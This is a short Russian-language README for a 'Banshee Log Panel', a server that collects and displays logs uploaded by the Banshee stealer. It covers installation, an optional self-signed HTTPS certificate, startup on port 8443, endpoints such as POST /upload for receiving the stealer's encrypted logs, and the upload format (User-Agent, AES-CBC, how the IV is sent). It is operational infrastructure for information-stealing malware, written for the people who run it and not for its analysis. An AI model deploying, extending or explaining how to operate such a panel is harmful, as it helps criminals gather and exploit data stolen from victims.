# Banshee Log Panel

Панель управления для приема и просмотра логов от стиллера Banshee.

## Установка

1. Установите Python 3.8 или выше
2. Установите зависимости:
```bash
pip install -r requirements.txt
```

## Настройка HTTPS (опционально)

Для работы с HTTPS сгенерируйте самоподписанный сертификат:

```bash
openssl req -x509 -newkey rsa:4096 -nodes -keyout server.key -out server.crt -days 365
```

Или используйте HTTP (стиллер принимает любые сертификаты).

## Запуск

```bash
python server.py
```

Сервер запустится на:
- HTTP/HTTPS: `http://0.0.0.0:8443` или `https://0.0.0.0:8443`
- Веб-интерфейс: откройте браузер и перейдите на `http://localhost:8443`

## Endpoints

- `GET /` - Веб-интерфейс для просмотра логов
- `POST /upload` - Прием зашифрованных логов от стиллера
- `GET /health` - Health check endpoint
- `GET /ping` - Ping endpoint
- `GET /api/logs` - API для получения списка всех логов
- `GET /download/<filename>` - Скачивание лога

## Формат загрузки

Стиллер отправляет файлы с:
- User-Agent: `BansheeFinalUploader/1.0`
- Шифрование: AES-CBC с PKCS7 padding
- IV может передаваться в заголовке `X-IV-Base64` (base64) или `X-IV` (hex), или в начале файла

## Структура данных

Логи сохраняются в папке `logs/` и информация о них в `logs_db.json`.

